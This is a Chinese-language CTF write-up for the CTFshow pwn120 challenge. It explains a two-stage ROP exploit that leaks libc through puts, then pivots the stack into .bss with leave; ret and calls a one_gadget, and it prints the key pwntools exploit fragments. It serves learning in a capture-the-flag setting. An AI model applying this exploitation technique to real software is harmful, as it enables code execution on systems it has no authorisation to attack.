---
title: CTFshow pwn120 栈迁移与二段 ROP
published: 2026-04-17
updated: 2026-04-17
description: 第一段先 leak puts 并把第二段链读进 .bss，随后用 leave; ret 做栈迁移，第二段再落 one_gadget。
tags: [CTFshow, Pwn, Stack, Stack Pivot, ROP]
category: ctfshow
draft: false
---

# 题目结论

这题只有一个 `exp.py`，但从脚本就能把利用链看清楚：标准的“泄露 + 栈迁移 + 二段链”。

## 利用思路

1. 第一段 payload 覆盖旧栈帧，顺便把新的 `rbp` 指到 `.bss`
2. 调 `puts(puts@got)` 泄露 libc
3. 再调 `read(0, data_addr, ...)` 把第二段链写入 `.bss`
4. 执行 `leave; ret`，把栈迁移到 `.bss`
5. 第二段只需要放 one_gadget 即可

## 关键 exp 片段

```python
payload1 = b'a' * 0x510 + p64(data_addr - 8)
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload1 += p64(pop_rdi_ret) + p64(0)
payload1 += p64(pop_rsi_r15_ret) + p64(data_addr) + p64(0)
payload1 += p64(read_addr) + p64(leave_addr)
```

```python
puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
base_addr = puts_addr - libc.sym['puts']
payload2 = p64(one_gadget + base_addr)
p.send(payload2)
```

## 下载

- [下载利用脚本 `exp.py`](../../attachments/ctfshow/pwn120/exp.py)

## 说明

这份资料里 `pwn120` 文件夹只保留了 exp，没有把原始二进制一并存下，所以这篇主要根据脚本还原打法。

## 适合记住的点

当现场栈空间不够放完整 ROP 时，`read + leave; ret` 做二段栈迁移是非常实用的通解。
